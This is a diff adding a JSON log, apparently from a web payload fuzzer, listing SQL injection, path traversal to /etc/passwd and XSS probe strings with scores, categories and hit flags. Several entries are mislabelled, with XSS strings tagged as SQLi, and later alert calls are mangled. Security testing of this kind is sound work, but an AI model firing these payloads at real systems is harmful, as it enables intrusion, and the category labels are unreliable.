@@ -1,0 +1,177 @@
+[
+  {
+    "payload": "' OR 1=1 --%00",
+    "score": 25,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.734294",
+    "hit": false
+  },
+  {
+    "payload": "../../etc/passwd--",
+    "score": 20,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.737405",
+    "hit": false
+  },
+  {
+    "payload": "<script>alert(1)</script>'",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T13:11:05.738218",
+    "hit": false
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>--",
+    "score": 30,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.739539",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>%00",
+    "score": 10,
+    "category": "Generic",
+    "timestamp": "2025-05-19T13:11:05.740361",
+    "hit": false
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>%00",
+    "score": 10,
+    "category": "Generic",
+    "timestamp": "2025-05-19T13:11:05.741154",
+    "hit": true
+  },
+  {
+    "payload": "../../etc/passwd%00",
+    "score": 0,
+    "category": "LFI",
+    "timestamp": "2025-05-19T13:11:05.741959",
+    "hit": false
+  },
+  {
+    "payload": "' OR 1=1 ----",
+    "score": 25,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.742733",
+    "hit": true
+  },
+  {
+    "payload": "../../etc/passwd\"",
+    "score": 0,
+    "category": "LFI",
+    "timestamp": "2025-05-19T13:11:05.743567",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>%00",
+    "score": 10,
+    "category": "Generic",
+    "timestamp": "2025-05-19T13:11:05.744517",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert(1)</script>--",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T13:11:05.745439",
+    "hit": true
+  },
+  {
+    "payload": "' OR 1=1 --'",
+    "score": 25,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.746409",
+    "hit": true
+  },
+  {
+    "payload": "' OR 1=1 --\"",
+    "score": 25,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.747365",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>'",
+    "score": 30,
+    "category": "Generic",
+    "timestamp": "2025-05-19T13:11:05.748431",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert(1)>'",
+    "score": 30,
+    "category": "Generic",
+    "timestamp": "2025-05-19T13:11:05.749340",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert974(95)</script>'",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T13:11:05.752250",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert868(87)>--",
+    "score": 30,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.753178",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert230(61)</script>'",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T13:11:05.754129",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert523(25)>'",
+    "score": 30,
+    "category": "Generic",
+    "timestamp": "2025-05-19T13:11:05.755113",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert157(10)</script>'",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T13:11:05.756116",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert339(80)>'",
+    "score": 30,
+    "category": "Generic",
+    "timestamp": "2025-05-19T13:11:05.757053",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert474(68)>--",
+    "score": 30,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.758067",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert955(70)>'",
+    "score": 30,
+    "category": "Generic",
+    "timestamp": "2025-05-19T13:11:05.758998",
+    "hit": true
+  },
+  {
+    "payload": "<script>alert160(29)</script>--",
+    "score": 45,
+    "category": "XSS",
+    "timestamp": "2025-05-19T13:11:05.760243",
+    "hit": true
+  },
+  {
+    "payload": "<img src=x onerror=alert966(80)>--",
+    "score": 30,
+    "category": "SQLi",
+    "timestamp": "2025-05-19T13:11:05.761137",
+    "hit": true
+  }
+]
